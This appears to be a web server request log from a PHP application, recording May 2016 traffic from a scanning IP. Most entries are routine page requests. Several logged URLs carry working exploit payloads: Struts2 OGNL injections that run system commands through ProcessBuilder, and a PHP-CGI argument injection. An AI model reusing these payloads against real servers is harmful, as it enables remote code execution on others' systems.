[ 2016-05-03T04:42:57+08:00 ] 121.42.0.38 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000315s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.005075s ]
INFO: [ app_begin ] --END-- [ RunTime:0.005135s ]

[ 2016-05-03T04:44:54+08:00 ] 121.42.0.38 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000306s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000432s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000488s ]

[ 2016-05-03T04:45:49+08:00 ] 121.42.0.38 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000310s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000435s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000495s ]

[ 2016-05-03T04:46:53+08:00 ] 121.42.0.38 /index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000305s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000409s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000465s ]

[ 2016-05-03T04:47:12+08:00 ] 121.42.0.38 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000330s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000414s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000472s ]

[ 2016-05-03T04:48:13+08:00 ] 121.42.0.38 /.DS_Store
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000348s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000456s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000514s ]

[ 2016-05-03T04:48:16+08:00 ] 121.42.0.38 /index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000306s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000417s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000483s ]

[ 2016-05-03T04:49:28+08:00 ] 121.42.0.38 /index.php?disp=dynamic
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000308s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000429s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000486s ]

[ 2016-05-03T04:49:31+08:00 ] 121.42.0.38 /index.php?disp=dynamic
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000307s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000573s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000663s ]

[ 2016-05-03T04:49:56+08:00 ] 121.42.0.38 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000331s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000448s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000506s ]

[ 2016-05-03T04:50:01+08:00 ] 121.42.0.38 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000343s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000410s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000467s ]

[ 2016-05-03T04:50:51+08:00 ] 121.42.0.38 /?test=com.opensymphony.xwork2.dispatcher.HttpServletResponse&test=1541517918&method:(%23_memberAccess).setExcludedClasses(%40java.util.Collections%40EMPTY_SET),(%23_memberAccess).setExcludedPackageNamePatterns(%40java.util.Collections%40EMPTY_SET),%23d%3d%23parameters.test%5B1%5D,%23test%3d%23context.get(%23parameters.test%5B0%5D).getWriter(),%23test.println(%23d),%23test.close(),new%20java.lang.String
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000312s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000433s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000489s ]

[ 2016-05-03T04:50:58+08:00 ] 121.42.0.38 /?test=com.opensymphony.xwork2.dispatcher.HttpServletResponse&test=1541517918&method:(%23_memberAccess).setExcludedClasses(%40java.util.Collections%40EMPTY_SET),(%23_memberAccess).setExcludedPackageNamePatterns(%40java.util.Collections%40EMPTY_SET),%23d%3d%23parameters.test%5B1%5D,%23test%3d%23context.get(%23parameters.test%5B0%5D).getWriter(),%23test.println(%23d),%23test.close(),new%20java.lang.String
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000407s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000471s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000529s ]

[ 2016-05-03T04:51:01+08:00 ] 121.42.0.38 /?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.pr%5B0%5D,%23b%3d%23parameters.cmd,%23c%3d%23parameters.args%5B0%5D,%23d%3d%23parameters.args%5B1%5D,%23e%3d%23parameters.args%5B2%5D,%23j%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5B%5D%7B%23b,%23c,%23d,%23e%7D)).start(),%23k%3d%23j.getInputStream(),%23l%3dnew+java.io.InputStreamReader(%23k),%23m%3dnew+java.io.BufferedReader(%23l),%23n%3dnew+char%5B20%5D,%23m.read(%23n),%23p%3d%23context.get(%23a),%23p.getWriter().println(%23n),%23p.getWriter().flush(),%23p.getWriter().close(),1?%23pr:%23request.toString&pr=com.opensymphony.xwork2.dispatcher.HttpServletResponse&cmd=expr&args=23123&args=%2a&args=66667
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000323s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000443s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000502s ]

[ 2016-05-03T04:51:15+08:00 ] 121.42.0.38 /?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.pr%5B0%5D,%23b%3d%23parameters.cmd,%23c%3d%23parameters.args,%23j%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5B%5D%7B%23b,%23c%7D)).start(),%23k%3d%23j.getInputStream(),%23l%3dnew+java.io.InputStreamReader(%23k),%23m%3dnew+java.io.BufferedReader(%23l),%23n%3dnew+char%5B2000%5D,%23m.read(%23n),%23p%3d%23context.get(%23a),%23p.getWriter().println(%23n),%23p.getWriter().flush(),%23p.getWriter().close(),1?%23pr:%23request.toString&pr=com.opensymphony.xwork2.dispatcher.HttpServletResponse&cmd=ipconfig&args=%2f%3f
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000311s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000444s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000502s ]

[ 2016-05-03T04:53:10+08:00 ] 121.42.0.38 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000306s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000412s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000470s ]

[ 2016-05-03T04:53:32+08:00 ] 121.42.0.38 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000306s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000432s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000505s ]

[ 2016-05-03T04:53:34+08:00 ] 121.42.0.38 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000307s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000449s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000510s ]

[ 2016-05-03T04:53:36+08:00 ] 121.42.0.38 /?q=node&destination=node
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: [ app_init ] --END-- [ RunTime:0.000562s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000441s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000508s ]

[ 2016-05-03T04:53:37+08:00 ] 121.42.0.38 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000306s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000435s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000493s ]

[ 2016-05-03T04:53:52+08:00 ] 121.42.0.38 /index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000036s ]
INFO: [ app_init ] --END-- [ RunTime:0.000342s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000431s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000489s ]

[ 2016-05-03T04:56:27+08:00 ] 121.42.0.38 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000304s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000412s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000471s ]

[ 2016-05-03T04:57:20+08:00 ] 121.42.0.38 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000305s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000451s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000531s ]

[ 2016-05-03T05:00:22+08:00 ] 121.42.0.57 /?.tmp=t
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000319s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000433s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000493s ]

[ 2016-05-03T05:00:24+08:00 ] 121.42.0.38 /?-dallow_url_include%3don+-dauto_prepend_file%3dphp://input
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000321s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000424s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000506s ]

[ 2016-05-03T05:02:19+08:00 ] 121.42.0.38 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000323s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000433s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000500s ]

[ 2016-05-03T05:03:59+08:00 ] 121.42.0.38 /index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000311s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000437s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000493s ]

